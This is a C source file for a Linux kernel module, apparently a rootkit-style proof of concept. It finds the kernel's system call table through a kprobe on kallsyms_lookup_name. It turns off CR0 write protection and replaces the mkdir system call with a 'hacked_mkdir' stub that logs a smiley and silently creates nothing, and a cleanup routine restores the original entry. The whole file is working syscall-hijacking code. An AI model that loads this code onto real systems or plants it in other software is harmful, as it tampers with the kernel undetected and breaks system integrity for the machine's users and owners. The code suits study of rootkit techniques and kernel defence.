#include <asm/unistd.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>

#include "include/sys_calls.h"

typedef asmlinkage long (*sys_call_ptr_t)(const struct pt_regs *);
typedef asmlinkage long (*mkdir_t)(const char *, mode_t);
typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);

static mkdir_t original_mkdir;
static unsigned long *syscall_table = NULL;

static asmlinkage long hacked_mkdir(const char *path, mode_t mode) {
	printk(KERN_INFO ":-)\n");

	return 0;
}

static unsigned long *get_syscall_table(void) {
	int ret = 0;
	unsigned long *sct = NULL;
	kallsyms_lookup_name_t lookup_name = NULL;
	struct kprobe kp = {
		.symbol_name = "kallsyms_lookup_name"
	};

	ret = register_kprobe(&kp);
	if (ret < 0) {
		return NULL;
	}

	unregister_kprobe(&kp);
	
	lookup_name = (kallsyms_lookup_name_t)kp.addr;
	sct = (unsigned long *)lookup_name("sys_call_table");
	return sct;
}

static inline void _write_cr0(unsigned long val) {
	__asm__ __volatile__("mov %0, %%cr0": "+r"(val));
}

static void disable_write_protection(void) {
	unsigned long val = read_cr0();
	val &= (~0x10000);
	_write_cr0(val);
}

static void enable_write_protection(void) {
	unsigned long val = read_cr0();
	val |= 0x10000;
	_write_cr0(val);
}

int sys_calls_init(void) {
	int rc = 0;

	disable_write_protection();

	syscall_table = get_syscall_table();
	if (syscall_table == NULL) {
		rc = -1;
		goto out;
	}
	original_mkdir = (mkdir_t)syscall_table[__NR_mkdir];
	syscall_table[__NR_mkdir] = (sys_call_ptr_t)hacked_mkdir;

out:
	enable_write_protection();
	return rc;
}

void sys_calls_cleanup(void) {
	disable_write_protection();

	syscall_table[__NR_mkdir] = (sys_call_ptr_t)original_mkdir;

	enable_write_protection();
}

